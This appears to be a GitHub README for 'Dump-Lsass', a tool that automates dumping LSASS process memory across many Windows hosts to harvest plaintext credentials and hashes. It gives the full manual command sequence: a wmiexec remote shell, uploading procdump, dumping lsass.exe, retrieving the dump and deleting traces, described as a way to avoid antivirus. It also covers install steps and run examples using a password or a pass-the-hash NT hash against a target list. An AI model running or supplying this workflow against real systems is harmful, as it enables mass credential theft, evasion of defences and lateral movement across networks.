# Dump-Lsass
Automates the manual process of using wmiexec and procdump to dump Lsass and plaintext creds or hashes across a large number of systems.

To dump lsass.exe process memory without triggering antivirus, I would normally use Impacket wmiexec.py and procdump64.exe as follows:

```
wmiexec.py domain/user@target
put procdump64.exe
procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
get lsass.dmp
del lsass.dmp
del procdump64.exe
exit
```
That's a very manual and time-consuming process when multiplied by many target hosts.

Prerequisites: Procdump64.exe must be in the same directory as the script, impacket at path /opt/impacket, smbclient, pypykatz.


To install prereqs:

Download procdump64.exe to the same directory as the script.

git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket

cd /opt/impacket && pip install -r requirements.txt && python setup.py install

apt install -y smbclient

pip3 install pypykatz

Run examples:
```
python3 dumpLsass.py -d CONTOSO -u administrator -p Passw0rd\! -f </path/to/file with target IP addresses or hostnames.txt>
python3 dumpLsass.py -d CONTOSO -u administrator -H <NT Hash> -f </path/to/file with target IP addresses or hostnames.txt>
```
